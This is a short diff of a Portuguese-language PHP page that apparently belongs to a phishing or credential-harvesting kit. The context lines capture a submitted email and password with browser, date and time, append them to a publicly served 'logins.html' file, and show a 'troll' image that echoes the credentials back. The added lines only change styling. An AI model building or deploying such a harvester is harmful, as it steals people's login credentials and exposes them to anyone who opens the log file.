@@ -10,6 +10,7 @@ $ess ="Email: ".$email."<br>Senha: ".$senha."<br>Navegador: ".$browser."
 <br>Data: ".$data."<br>Hora: ".$hora."<br>".$traco;
 $abre =@fopen("logins.html","a+");
 $escreve =fwrite($abre, $ess);
+	
 
     
 // function redirecionar($url, $tempo) 
@@ -30,6 +31,11 @@ $escreve =fwrite($abre, $ess);
 // } 
 ?>
 
+
+<body style="background: #000;"> 
+	
+<div style="color: #fff;">
+	
 <div style="float:left;">
     
 <img src="img/troll.jpg" height="500" width="600">
@@ -40,3 +46,4 @@ $escreve =fwrite($abre, $ess);
         <h1>Seu email: <?php echo $email; ?></h1>
         <h1>Sua Senha: <?php  echo $senha; ?></h1>
     </div>
+</div>
